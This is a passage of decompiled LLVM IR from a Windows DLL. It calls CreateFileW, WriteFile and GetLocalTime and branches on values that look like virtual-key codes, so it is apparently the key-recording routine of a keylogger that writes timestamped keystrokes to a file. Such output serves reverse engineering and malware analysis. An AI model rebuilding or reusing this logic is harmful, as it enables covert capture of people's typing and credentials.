  %102 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !929
  store i32 0, i32* @global_var_100405a0, align 4, !insn.addr !930
  store i32 %100, i32* %esp.2.reg2mem, !insn.addr !931
  br label %dec_label_pc_10002b68, !insn.addr !931

dec_label_pc_10002b54:                            ; preds = %dec_label_pc_10002b13
  store i32 4, i32* %81, align 4, !insn.addr !932
  %103 = add i32 %esp.1.reload, -32, !insn.addr !933
  %104 = inttoptr i32 %103 to i32*, !insn.addr !933
  store i32 0, i32* %104, align 4, !insn.addr !933
  %105 = add i32 %esp.1.reload, -36, !insn.addr !934
  %106 = inttoptr i32 %105 to i32*, !insn.addr !934
  store i32 1, i32* %106, align 4, !insn.addr !934
  %107 = add i32 %esp.1.reload, -40, !insn.addr !935
  %108 = inttoptr i32 %107 to i32*, !insn.addr !935
  store i32 4, i32* %108, align 4, !insn.addr !935
  %109 = add i32 %esp.1.reload, -44, !insn.addr !936
  %110 = inttoptr i32 %109 to i32*, !insn.addr !936
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %110, align 4, !insn.addr !936
  %111 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !937
  %112 = ptrtoint i32* %111 to i32, !insn.addr !937
  store i32 %112, i32* @global_var_1003e9c0, align 4, !insn.addr !938
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !938
  br label %dec_label_pc_10002b68, !insn.addr !938

dec_label_pc_10002b68:                            ; preds = %dec_label_pc_10002b54, %dec_label_pc_10002b23
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %113 = add i32 %esp.2.reload, -4, !insn.addr !939
  %114 = inttoptr i32 %113 to i32*, !insn.addr !939
  store i32 ptrtoint (i16* @global_var_10040fb0 to i32), i32* %114, align 4, !insn.addr !939
  call void @GetLocalTime(%_SYSTEMTIME* bitcast (i32* @4 to %_SYSTEMTIME*)), !insn.addr !940
  %115 = load i16, i16* @global_var_10040fbc, align 2, !insn.addr !941
  %116 = zext i16 %115 to i32, !insn.addr !941
  %117 = add i32 %esp.2.reload, -8, !insn.addr !942
  %118 = inttoptr i32 %117 to i32*, !insn.addr !942
  store i32 ptrtoint (i16** @global_var_100405a8 to i32), i32* %118, align 4, !insn.addr !942
  %119 = add i32 %esp.2.reload, -12, !insn.addr !943
  %120 = inttoptr i32 %119 to i32*, !insn.addr !943
  store i32 %116, i32* %120, align 4, !insn.addr !943
  %121 = load i16, i16* @global_var_10040fba, align 2, !insn.addr !944
  %122 = zext i16 %121 to i32, !insn.addr !944
  %123 = add i32 %esp.2.reload, -16, !insn.addr !945
  %124 = inttoptr i32 %123 to i32*, !insn.addr !945
  store i32 %122, i32* %124, align 4, !insn.addr !945
  %125 = load i16, i16* @global_var_10040fb8, align 2, !insn.addr !946
  %126 = zext i16 %125 to i32, !insn.addr !946
  %127 = add i32 %esp.2.reload, -20, !insn.addr !947
  %128 = inttoptr i32 %127 to i32*, !insn.addr !947
  store i32 %126, i32* %128, align 4, !insn.addr !947
  %129 = load i16, i16* @global_var_10040fb6, align 2, !insn.addr !948
  %130 = zext i16 %129 to i32, !insn.addr !948
  %131 = add i32 %esp.2.reload, -24, !insn.addr !949
  %132 = inttoptr i32 %131 to i32*, !insn.addr !949
  store i32 %130, i32* %132, align 4, !insn.addr !949
  %133 = load i16, i16* @global_var_10040fb2, align 2, !insn.addr !950
  %134 = zext i16 %133 to i32, !insn.addr !950
  %135 = add i32 %esp.2.reload, -28, !insn.addr !951
  %136 = inttoptr i32 %135 to i32*, !insn.addr !951
  store i32 %134, i32* %136, align 4, !insn.addr !951
  %137 = load i16, i16* @global_var_10040fb0, align 2, !insn.addr !952
  %138 = zext i16 %137 to i32, !insn.addr !952
  %139 = add i32 %esp.2.reload, -32, !insn.addr !953
  %140 = inttoptr i32 %139 to i32*, !insn.addr !953
  store i32 %138, i32* %140, align 4, !insn.addr !953
  %141 = add i32 %esp.2.reload, -36, !insn.addr !954
  %142 = inttoptr i32 %141 to i32*, !insn.addr !954
  store i32 ptrtoint ([40 x i16]* @global_var_10039238 to i32), i32* %142, align 4, !insn.addr !954
  %143 = add i32 %esp.2.reload, -40, !insn.addr !955
  %144 = inttoptr i32 %143 to i32*, !insn.addr !955
  store i32 ptrtoint (i16** @global_var_1003fda0 to i32), i32* %144, align 4, !insn.addr !955
  %145 = call i32 (i16*, i16*, ...) @wsprintfW(i16* bitcast (i32* @4 to i16*), i16* bitcast (i32* @4 to i16*)), !insn.addr !956
  store i32 ptrtoint (i16** @global_var_1003fda0 to i32), i32* %eax.2.reg2mem, !insn.addr !957
  br label %dec_label_pc_10002bc3, !insn.addr !957

dec_label_pc_10002bc3:                            ; preds = %dec_label_pc_10002bc3, %dec_label_pc_10002b68
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %146 = inttoptr i32 %eax.2.reload to i16*, !insn.addr !958
  %147 = load i16, i16* %146, align 2, !insn.addr !958
  %148 = add i32 %eax.2.reload, 2, !insn.addr !959
  %149 = icmp eq i16 %147, 0, !insn.addr !960
  %150 = icmp eq i1 %149, false, !insn.addr !961
  store i32 %148, i32* %eax.2.reg2mem, !insn.addr !961
  br i1 %150, label %dec_label_pc_10002bc3, label %dec_label_pc_10002bce, !insn.addr !961

dec_label_pc_10002bce:                            ; preds = %dec_label_pc_10002bc3
  %151 = sub i32 %148, ptrtoint (i32* @global_var_1003fda2 to i32), !insn.addr !962
  store i32 0, i32* %118, align 4, !insn.addr !963
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %120, align 4, !insn.addr !964
  store i32 %151, i32* %124, align 4, !insn.addr !965
  store i32 ptrtoint (i16** @global_var_1003fda0 to i32), i32* %128, align 4, !insn.addr !966
  %152 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !967
  store i32 %152, i32* %132, align 4, !insn.addr !967
  %153 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !968
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !969
  br label %dec_label_pc_10002bf0, !insn.addr !969

dec_label_pc_10002bf0:                            ; preds = %dec_label_pc_10002bf0, %dec_label_pc_10002bce
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %154 = add i32 %ecx.3.reload, ptrtoint (i16** @global_var_100405a8 to i32), !insn.addr !970
  %155 = inttoptr i32 %154 to i16*, !insn.addr !970
  %156 = load i16, i16* %155, align 2, !insn.addr !970
  %157 = add i32 %ecx.3.reload, 2, !insn.addr !971
  %158 = add i32 %ecx.3.reload, 268701888, !insn.addr !972
  %159 = inttoptr i32 %158 to i16*, !insn.addr !972
  store i16 %156, i16* %159, align 2, !insn.addr !972
  %160 = icmp eq i16 %156, 0, !insn.addr !973
  %161 = icmp eq i1 %160, false, !insn.addr !974
  store i32 %157, i32* %ecx.3.reg2mem, !insn.addr !974
  br i1 %161, label %dec_label_pc_10002bf0, label %dec_label_pc_10002c06, !insn.addr !974

dec_label_pc_10002c06:                            ; preds = %dec_label_pc_10002bf0
  %162 = load i32, i32* @global_var_1003e9c0, align 4, !insn.addr !975
  store i32 %162, i32* %136, align 4, !insn.addr !975
  %163 = call i1 @CloseHandle(i32* nonnull @4), !insn.addr !976
  store i32 %135, i32* %esp.3.reg2mem, !insn.addr !976
  br label %dec_label_pc_10002c0e, !insn.addr !976

dec_label_pc_10002c0e:                            ; preds = %dec_label_pc_10002ae8, %dec_label_pc_10002af7, %dec_label_pc_10002c06, %dec_label_pc_10002aa9
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %164 = ptrtoint i16* %stack_var_-216.0.reload to i32
  store i32 %164, i32* @3, align 4, !insn.addr !977
  %165 = trunc i32 %164 to i16, !insn.addr !978
  %.off = add i16 %165, -39
  %166 = icmp ult i16 %.off, 52
  br i1 %166, label %dec_label_pc_100034af, label %dec_label_pc_10002c24, !insn.addr !978

dec_label_pc_10002c24:                            ; preds = %dec_label_pc_10002c0e
  store i32 %164, i32* %.pre-phi.reg2mem, !insn.addr !979
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !979
  switch i32 %164, label %dec_label_pc_1000348f [
    i32 0, label %dec_label_pc_10002cbd
    i32 1, label %dec_label_pc_10002f5e
    i32 2, label %dec_label_pc_10002cbd
    i32 3, label %dec_label_pc_10002f5e
    i32 4, label %dec_label_pc_10002cbd
    i32 5, label %dec_label_pc_10002d16
    i32 9, label %dec_label_pc_10002c72
    i32 13, label %dec_label_pc_10002d6b
    i32 14, label %dec_label_pc_10003423
    i32 16, label %dec_label_pc_100031c1
    i32 28, label %dec_label_pc_10002c43
    i32 29, label %dec_label_pc_1000321a
    i32 30, label %dec_label_pc_1000326c
    i32 31, label %dec_label_pc_100032c6
    i32 32, label %dec_label_pc_1000331b
    i32 42, label %dec_label_pc_10002dc6
    i32 87, label %dec_label_pc_10003376
    i32 88, label %dec_label_pc_100033cb
    i32 92, label %dec_label_pc_10002f00
    i32 93, label %dec_label_pc_10002f2f
    i32 94, label %dec_label_pc_10002f5e
    i32 95, label %dec_label_pc_10002f8d
    i32 96, label %dec_label_pc_10002fbc
    i32 97, label %dec_label_pc_10002feb
    i32 98, label %dec_label_pc_1000301a
    i32 99, label %dec_label_pc_10003049
    i32 100, label %dec_label_pc_10003078
    i32 101, label %dec_label_pc_100030a7
    i32 102, label %dec_label_pc_100030d6
    i32 103, label %dec_label_pc_10003105
    i32 105, label %dec_label_pc_10003134
    i32 106, label %dec_label_pc_10003163
    i32 107, label %dec_label_pc_10003192
    i32 182, label %dec_label_pc_10002e1b
    i32 183, label %dec_label_pc_10002e84
    i32 184, label %dec_label_pc_10002eb3
    i32 185, label %dec_label_pc_10002ec2
    i32 186, label %dec_label_pc_10002ef1
    i32 187, label %dec_label_pc_10002e2a
    i32 188, label %dec_label_pc_10002e39
  ], !insn.addr !979

dec_label_pc_10002c43:                            ; preds = %dec_label_pc_10002c24
  %167 = add i32 %esp.3.reload, -4, !insn.addr !980
  %168 = inttoptr i32 %167 to i32*, !insn.addr !980
  store i32 0, i32* %168, align 4, !insn.addr !980
  %169 = add i32 %esp.3.reload, -8, !insn.addr !981
  %170 = inttoptr i32 %169 to i32*, !insn.addr !981
  store i32 128, i32* %170, align 4, !insn.addr !981
  %171 = add i32 %esp.3.reload, -12, !insn.addr !982
  %172 = inttoptr i32 %171 to i32*, !insn.addr !982
  store i32 4, i32* %172, align 4, !insn.addr !982
  %173 = add i32 %esp.3.reload, -16, !insn.addr !983
  %174 = inttoptr i32 %173 to i32*, !insn.addr !983
  store i32 0, i32* %174, align 4, !insn.addr !983
  %175 = add i32 %esp.3.reload, -20, !insn.addr !984
  %176 = inttoptr i32 %175 to i32*, !insn.addr !984
  store i32 1, i32* %176, align 4, !insn.addr !984
  %177 = add i32 %esp.3.reload, -24, !insn.addr !985
  %178 = inttoptr i32 %177 to i32*, !insn.addr !985
  store i32 4, i32* %178, align 4, !insn.addr !985
  %179 = add i32 %esp.3.reload, -28, !insn.addr !986
  %180 = inttoptr i32 %179 to i32*, !insn.addr !986
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %180, align 4, !insn.addr !986
  %181 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !987
  %182 = ptrtoint i32* %181 to i32, !insn.addr !987
  %183 = add i32 %esp.3.reload, -32, !insn.addr !988
  %184 = inttoptr i32 %183 to i32*, !insn.addr !988
  store i32 0, i32* %184, align 4, !insn.addr !988
  %185 = add i32 %esp.3.reload, -36, !insn.addr !989
  %186 = inttoptr i32 %185 to i32*, !insn.addr !989
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %186, align 4, !insn.addr !989
  %187 = add i32 %esp.3.reload, -40, !insn.addr !990
  %188 = inttoptr i32 %187 to i32*, !insn.addr !990
  store i32 2, i32* %188, align 4, !insn.addr !990
  %189 = add i32 %esp.3.reload, -44, !insn.addr !991
  %190 = inttoptr i32 %189 to i32*, !insn.addr !991
  store i32 ptrtoint (i32* @global_var_10039234 to i32), i32* %190, align 4, !insn.addr !991
  store i32 %182, i32* @global_var_1003e9c0, align 4, !insn.addr !992
  %191 = add i32 %esp.3.reload, -48, !insn.addr !993
  %192 = inttoptr i32 %191 to i32*, !insn.addr !993
  store i32 %182, i32* %192, align 4, !insn.addr !993
  store i32 %191, i32* %esp.5.reg2mem, !insn.addr !994
  br label %dec_label_pc_10003485, !insn.addr !994

dec_label_pc_10002c72:                            ; preds = %dec_label_pc_10002c24
  %193 = call i128 @__asm_movaps(i128 7368318247016640781110928015451), !insn.addr !995
  %194 = add i32 %esp.3.reload, -4, !insn.addr !996
  %195 = inttoptr i32 %194 to i32*, !insn.addr !996
  store i32 0, i32* %195, align 4, !insn.addr !996
  %196 = add i32 %esp.3.reload, -8, !insn.addr !997
  %197 = inttoptr i32 %196 to i32*, !insn.addr !997
  store i32 128, i32* %197, align 4, !insn.addr !997
  %198 = add i32 %esp.3.reload, -12, !insn.addr !998
  %199 = inttoptr i32 %198 to i32*, !insn.addr !998
  store i32 4, i32* %199, align 4, !insn.addr !998
  %200 = add i32 %esp.3.reload, -16, !insn.addr !999
  %201 = inttoptr i32 %200 to i32*, !insn.addr !999
  store i32 0, i32* %201, align 4, !insn.addr !999
  %202 = add i32 %esp.3.reload, -20, !insn.addr !1000
  %203 = inttoptr i32 %202 to i32*, !insn.addr !1000
  store i32 1, i32* %203, align 4, !insn.addr !1000
  %204 = add i32 %esp.3.reload, -24, !insn.addr !1001
  %205 = inttoptr i32 %204 to i32*, !insn.addr !1001
  store i32 4, i32* %205, align 4, !insn.addr !1001
  %206 = add i32 %esp.3.reload, -28, !insn.addr !1002
  %207 = inttoptr i32 %206 to i32*, !insn.addr !1002
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %207, align 4, !insn.addr !1002
  %208 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1003
  call void @__asm_movups(i128 %208, i128 %193), !insn.addr !1003
  %209 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1004
  %210 = ptrtoint i32* %209 to i32, !insn.addr !1004
  store i32 %210, i32* @global_var_1003e9c0, align 4, !insn.addr !1005
  store i32 %34, i32* %ecx.4.reg2mem, !insn.addr !1006
  br label %dec_label_pc_10002ca7, !insn.addr !1006

dec_label_pc_10002ca7:                            ; preds = %dec_label_pc_10002ca7, %dec_label_pc_10002c72
  %ecx.4.reload = load i32, i32* %ecx.4.reg2mem
  %211 = inttoptr i32 %ecx.4.reload to i16*, !insn.addr !1007
  %212 = load i16, i16* %211, align 2, !insn.addr !1007
  %213 = add i32 %ecx.4.reload, 2, !insn.addr !1008
  %214 = icmp eq i16 %212, 0, !insn.addr !1009
  %215 = icmp eq i1 %214, false, !insn.addr !1010
  store i32 %213, i32* %ecx.4.reg2mem, !insn.addr !1010
  store i32 %213, i32* %.pn.reg2mem, !insn.addr !1010
  store i32 %210, i32* %edx.6.reg2mem, !insn.addr !1010
  store i32 %206, i32* %esp.4.reg2mem, !insn.addr !1010
  br i1 %215, label %dec_label_pc_10002ca7, label %dec_label_pc_10003473, !insn.addr !1010

dec_label_pc_10002cbd:                            ; preds = %dec_label_pc_10002c24, %dec_label_pc_10002c24, %dec_label_pc_10002c24
  %216 = call i128 @__asm_movaps(i128 %39), !insn.addr !1011
  %217 = add i32 %esp.3.reload, -4, !insn.addr !1012
  %218 = inttoptr i32 %217 to i32*, !insn.addr !1012
  store i32 0, i32* %218, align 4, !insn.addr !1012
  %219 = add i32 %esp.3.reload, -8, !insn.addr !1013
  %220 = inttoptr i32 %219 to i32*, !insn.addr !1013
  store i32 128, i32* %220, align 4, !insn.addr !1013
  %221 = add i32 %esp.3.reload, -12, !insn.addr !1014
  %222 = inttoptr i32 %221 to i32*, !insn.addr !1014
  store i32 4, i32* %222, align 4, !insn.addr !1014
  %223 = add i32 %esp.3.reload, -16, !insn.addr !1015
  %224 = inttoptr i32 %223 to i32*, !insn.addr !1015
  store i32 0, i32* %224, align 4, !insn.addr !1015
  %225 = add i32 %esp.3.reload, -20, !insn.addr !1016
  %226 = inttoptr i32 %225 to i32*, !insn.addr !1016
  store i32 1, i32* %226, align 4, !insn.addr !1016
  %227 = add i32 %esp.3.reload, -24, !insn.addr !1017
  %228 = inttoptr i32 %227 to i32*, !insn.addr !1017
  store i32 4, i32* %228, align 4, !insn.addr !1017
  %229 = add i32 %esp.3.reload, -28, !insn.addr !1018
  %230 = inttoptr i32 %229 to i32*, !insn.addr !1018
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %230, align 4, !insn.addr !1018
  %231 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1019
  call void @__asm_movups(i128 %231, i128 %216), !insn.addr !1019
  %232 = call i32* @CreateFileW(i16* inttoptr (i32 4522051 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1020
  %233 = ptrtoint i32* %232 to i32, !insn.addr !1020
  store i32 %233, i32* @global_var_1003e9c0, align 4, !insn.addr !1021
  store i32 %34, i32* %ecx.5.reg2mem, !insn.addr !1022
  br label %dec_label_pc_10002d00, !insn.addr !1022

dec_label_pc_10002d00:                            ; preds = %dec_label_pc_10002d00, %dec_label_pc_10002cbd
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %234 = inttoptr i32 %ecx.5.reload to i16*, !insn.addr !1023
  %235 = load i16, i16* %234, align 2, !insn.addr !1023
  %236 = add i32 %ecx.5.reload, 2, !insn.addr !1024
  %237 = icmp eq i16 %235, 0, !insn.addr !1025
  %238 = icmp eq i1 %237, false, !insn.addr !1026
  store i32 %236, i32* %ecx.5.reg2mem, !insn.addr !1026
  store i32 %236, i32* %.pn.reg2mem, !insn.addr !1026
  store i32 %233, i32* %edx.6.reg2mem, !insn.addr !1026
  store i32 %229, i32* %esp.4.reg2mem, !insn.addr !1026
  br i1 %238, label %dec_label_pc_10002d00, label %dec_label_pc_10003473, !insn.addr !1026

dec_label_pc_10002d16:                            ; preds = %dec_label_pc_10002c24
  %239 = add i32 %esp.3.reload, -4, !insn.addr !1027
  %240 = inttoptr i32 %239 to i32*, !insn.addr !1027
  store i32 0, i32* %240, align 4, !insn.addr !1027
  %241 = add i32 %esp.3.reload, -8, !insn.addr !1028
  %242 = inttoptr i32 %241 to i32*, !insn.addr !1028
  store i32 128, i32* %242, align 4, !insn.addr !1028
  %243 = add i32 %esp.3.reload, -12, !insn.addr !1029
  %244 = inttoptr i32 %243 to i32*, !insn.addr !1029
  store i32 4, i32* %244, align 4, !insn.addr !1029
  %245 = add i32 %esp.3.reload, -16, !insn.addr !1030
  %246 = inttoptr i32 %245 to i32*, !insn.addr !1030
  store i32 0, i32* %246, align 4, !insn.addr !1030
  %247 = add i32 %esp.3.reload, -20, !insn.addr !1031
  %248 = inttoptr i32 %247 to i32*, !insn.addr !1031
  store i32 1, i32* %248, align 4, !insn.addr !1031
  %249 = add i32 %esp.3.reload, -24, !insn.addr !1032
  %250 = inttoptr i32 %249 to i32*, !insn.addr !1032
  store i32 4, i32* %250, align 4, !insn.addr !1032
  %251 = add i32 %esp.3.reload, -28, !insn.addr !1033
  %252 = inttoptr i32 %251 to i32*, !insn.addr !1033
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %252, align 4, !insn.addr !1033
  store i128 5505115, i128* %stack_var_-108, align 8, !insn.addr !1034
  %253 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1035
  %254 = ptrtoint i32* %253 to i32, !insn.addr !1035
  store i32 %254, i32* @global_var_1003e9c0, align 4, !insn.addr !1036
  store i32 %34, i32* %ecx.6.reg2mem, !insn.addr !1037
  br label %dec_label_pc_10002d55, !insn.addr !1037

dec_label_pc_10002d55:                            ; preds = %dec_label_pc_10002d55, %dec_label_pc_10002d16
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %255 = inttoptr i32 %ecx.6.reload to i16*, !insn.addr !1038
  %256 = load i16, i16* %255, align 2, !insn.addr !1038
  %257 = add i32 %ecx.6.reload, 2, !insn.addr !1039
  %258 = icmp eq i16 %256, 0, !insn.addr !1040
  %259 = icmp eq i1 %258, false, !insn.addr !1041
  store i32 %257, i32* %ecx.6.reg2mem, !insn.addr !1041
  store i32 %257, i32* %.pn.reg2mem, !insn.addr !1041
  store i32 %254, i32* %edx.6.reg2mem, !insn.addr !1041
  store i32 %251, i32* %esp.4.reg2mem, !insn.addr !1041
  br i1 %259, label %dec_label_pc_10002d55, label %dec_label_pc_10003473, !insn.addr !1041

dec_label_pc_10002d6b:                            ; preds = %dec_label_pc_10002c24
  %260 = add i32 %esp.3.reload, -4, !insn.addr !1042
  %261 = inttoptr i32 %260 to i32*, !insn.addr !1042
  store i32 0, i32* %261, align 4, !insn.addr !1042
  %262 = add i32 %esp.3.reload, -8, !insn.addr !1043
  %263 = inttoptr i32 %262 to i32*, !insn.addr !1043
  store i32 128, i32* %263, align 4, !insn.addr !1043
  %264 = add i32 %esp.3.reload, -12, !insn.addr !1044
  %265 = inttoptr i32 %264 to i32*, !insn.addr !1044
  store i32 4, i32* %265, align 4, !insn.addr !1044
  %266 = add i32 %esp.3.reload, -16, !insn.addr !1045
  %267 = inttoptr i32 %266 to i32*, !insn.addr !1045
  store i32 0, i32* %267, align 4, !insn.addr !1045
  %268 = add i32 %esp.3.reload, -20, !insn.addr !1046
  %269 = inttoptr i32 %268 to i32*, !insn.addr !1046
  store i32 1, i32* %269, align 4, !insn.addr !1046
  %270 = add i32 %esp.3.reload, -24, !insn.addr !1047
  %271 = inttoptr i32 %270 to i32*, !insn.addr !1047
  store i32 4, i32* %271, align 4, !insn.addr !1047
  %272 = add i32 %esp.3.reload, -28, !insn.addr !1048
  %273 = inttoptr i32 %272 to i32*, !insn.addr !1048
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %273, align 4, !insn.addr !1048
  store i128 4391003, i128* %stack_var_-108, align 8, !insn.addr !1049
  %274 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1050
  %275 = ptrtoint i32* %274 to i32, !insn.addr !1050
  store i32 %275, i32* @global_var_1003e9c0, align 4, !insn.addr !1051
  store i32 %34, i32* %ecx.7.reg2mem, !insn.addr !1052
  br label %dec_label_pc_10002db0, !insn.addr !1052

dec_label_pc_10002db0:                            ; preds = %dec_label_pc_10002db0, %dec_label_pc_10002d6b
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %276 = inttoptr i32 %ecx.7.reload to i16*, !insn.addr !1053
  %277 = load i16, i16* %276, align 2, !insn.addr !1053
  %278 = add i32 %ecx.7.reload, 2, !insn.addr !1054
  %279 = icmp eq i16 %277, 0, !insn.addr !1055
  %280 = icmp eq i1 %279, false, !insn.addr !1056
  store i32 %278, i32* %ecx.7.reg2mem, !insn.addr !1056
  store i32 %278, i32* %.pn.reg2mem, !insn.addr !1056
  store i32 %275, i32* %edx.6.reg2mem, !insn.addr !1056
  store i32 %272, i32* %esp.4.reg2mem, !insn.addr !1056
  br i1 %280, label %dec_label_pc_10002db0, label %dec_label_pc_10003473, !insn.addr !1056

dec_label_pc_10002dc6:                            ; preds = %dec_label_pc_10002c24
  %281 = add i32 %esp.3.reload, -4, !insn.addr !1057
  %282 = inttoptr i32 %281 to i32*, !insn.addr !1057
  store i32 0, i32* %282, align 4, !insn.addr !1057
  %283 = add i32 %esp.3.reload, -8, !insn.addr !1058
  %284 = inttoptr i32 %283 to i32*, !insn.addr !1058
  store i32 128, i32* %284, align 4, !insn.addr !1058
  %285 = add i32 %esp.3.reload, -12, !insn.addr !1059
  %286 = inttoptr i32 %285 to i32*, !insn.addr !1059
  store i32 4, i32* %286, align 4, !insn.addr !1059
  %287 = add i32 %esp.3.reload, -16, !insn.addr !1060
  %288 = inttoptr i32 %287 to i32*, !insn.addr !1060
  store i32 0, i32* %288, align 4, !insn.addr !1060
  %289 = add i32 %esp.3.reload, -20, !insn.addr !1061
  %290 = inttoptr i32 %289 to i32*, !insn.addr !1061
  store i32 1, i32* %290, align 4, !insn.addr !1061
  %291 = add i32 %esp.3.reload, -24, !insn.addr !1062
  %292 = inttoptr i32 %291 to i32*, !insn.addr !1062
  store i32 4, i32* %292, align 4, !insn.addr !1062
  %293 = add i32 %esp.3.reload, -28, !insn.addr !1063
  %294 = inttoptr i32 %293 to i32*, !insn.addr !1063
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %294, align 4, !insn.addr !1063
  store i128 4456539, i128* %stack_var_-108, align 8, !insn.addr !1064
  %295 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1065
  %296 = ptrtoint i32* %295 to i32, !insn.addr !1065
  store i32 %296, i32* @global_var_1003e9c0, align 4, !insn.addr !1066
  store i32 %34, i32* %ecx.8.reg2mem, !insn.addr !1067
  br label %dec_label_pc_10002e05, !insn.addr !1067

dec_label_pc_10002e05:                            ; preds = %dec_label_pc_10002e05, %dec_label_pc_10002dc6
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %297 = inttoptr i32 %ecx.8.reload to i16*, !insn.addr !1068
  %298 = load i16, i16* %297, align 2, !insn.addr !1068
  %299 = add i32 %ecx.8.reload, 2, !insn.addr !1069
  %300 = icmp eq i16 %298, 0, !insn.addr !1070
  %301 = icmp eq i1 %300, false, !insn.addr !1071
  store i32 %299, i32* %ecx.8.reg2mem, !insn.addr !1071
  store i32 %299, i32* %.pn.reg2mem, !insn.addr !1071
  store i32 %296, i32* %edx.6.reg2mem, !insn.addr !1071
  store i32 %293, i32* %esp.4.reg2mem, !insn.addr !1071
  br i1 %301, label %dec_label_pc_10002e05, label %dec_label_pc_10003473, !insn.addr !1071

dec_label_pc_10002e1b:                            ; preds = %dec_label_pc_10002c24
  %302 = call i32 @function_10002650(), !insn.addr !1072
  store i32 182, i32* %.pre-phi.reg2mem, !insn.addr !1073
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1073
  br label %dec_label_pc_1000348f, !insn.addr !1073

dec_label_pc_10002e2a:                            ; preds = %dec_label_pc_10002c24
  %303 = call i32 @function_10002650(), !insn.addr !1074
  store i32 187, i32* %.pre-phi.reg2mem, !insn.addr !1075
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1075
  br label %dec_label_pc_1000348f, !insn.addr !1075

dec_label_pc_10002e39:                            ; preds = %dec_label_pc_10002c24
  %304 = call i32 @function_10002650(), !insn.addr !1076
  store i32 188, i32* %.pre-phi.reg2mem, !insn.addr !1077
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1077
  br label %dec_label_pc_1000348f, !insn.addr !1077

dec_label_pc_10002e84:                            ; preds = %dec_label_pc_10002c24
  %305 = add i32 %esp.3.reload, -4, !insn.addr !1078
  %306 = inttoptr i32 %305 to i32*, !insn.addr !1078
  store i32 0, i32* %306, align 4, !insn.addr !1078
  %307 = add i32 %esp.3.reload, -8, !insn.addr !1079
  %308 = inttoptr i32 %307 to i32*, !insn.addr !1079
  store i32 128, i32* %308, align 4, !insn.addr !1079
  %309 = add i32 %esp.3.reload, -12, !insn.addr !1080
  %310 = inttoptr i32 %309 to i32*, !insn.addr !1080
  store i32 4, i32* %310, align 4, !insn.addr !1080
  %311 = add i32 %esp.3.reload, -16, !insn.addr !1081
  %312 = inttoptr i32 %311 to i32*, !insn.addr !1081
  store i32 0, i32* %312, align 4, !insn.addr !1081
  %313 = add i32 %esp.3.reload, -20, !insn.addr !1082
  %314 = inttoptr i32 %313 to i32*, !insn.addr !1082
  store i32 1, i32* %314, align 4, !insn.addr !1082
